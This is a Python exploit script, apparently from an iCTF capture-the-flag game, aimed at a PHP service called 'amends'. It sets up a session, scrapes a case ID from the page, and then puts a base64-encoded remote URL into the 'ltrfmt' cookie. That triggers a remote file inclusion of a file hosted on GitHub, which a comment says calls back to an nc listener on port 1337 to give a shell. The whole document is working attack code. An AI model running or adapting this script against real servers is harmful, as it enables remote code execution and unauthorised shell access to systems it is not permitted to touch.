#!/usr/bin/python3

import random
import requests
import string
import sys

from base64 import b64encode
from bs4 import BeautifulSoup

# Remote file inclusion target, nc listening on port 1337
RINCLUDE = "https://raw.githubusercontent.com/CurtisFielding/misc/master/ictf07_settlement.inc"

def usage():
    print("Usage: acct_exploit.py <host>")
    sys.exit(1)

def randstr(len):
    return ''.join(random.choice(string.ascii_uppercase) for i in range(len))

def exploit(target, payload):

    s = requests.Session()

    email = randstr(8) + '@' + randstr(3) + '.' + randstr(3)

    # parameters for amends.php
    amndparams = {
        'first'   : randstr(3),
        'last'    : randstr(3),
        'email'   : email,
        'comment' : randstr(3),
        'price'   : '1.00'
    }

    # params for ltr.php
    ltrparams = {
        'ltrfmt' : 'pdf'
    }

    # params for settlement.php
    # caseid is parsed from page later
    setldata = {
        'email'  : email,
        'caseid' : '',
    }

    newcookies = {
        'PHPSESSID' : '',
        'ltrfmt'    : '',
    }

    r = s.get('http://' + target + '/~amends/cgi-bin/amends.php', params=amndparams)
    r = s.get('http://' + target + '/~amends/cgi-bin/ltr.php', params=ltrparams)

    # parse for caseid, a later form needs it
    soup = BeautifulSoup(r.text)
    table = soup.find('table')
    row = table.find_all('tr')[1]
    setldata['caseid'] = row.find_all('td')[1]

    newcookies['PHPSESSID'] = s.cookies['PHPSESSID']
    newcookies['ltrfmt'] = payload

    # If I don't set previous cookie vals to None, adding new
    # cookie vals will just create redundant cookies
    s.cookies.update({"PHPSESSID" : None, "ltrfmt" : None})
    s.cookies.update(newcookies)
    r = s.post('http://' + target + '/~amends/cgi-bin/settlement.php', data=setldata)
    

def main():
    global RINCLUDE
    
    if len(sys.argv) != 2:
        usage()
        
    host = sys.argv[1]
    payload = b64encode(RINCLUDE.encode('ascii')).decode()
    resp = exploit(host, payload)
        
if __name__ == '__main__':
    main()
        
        
    
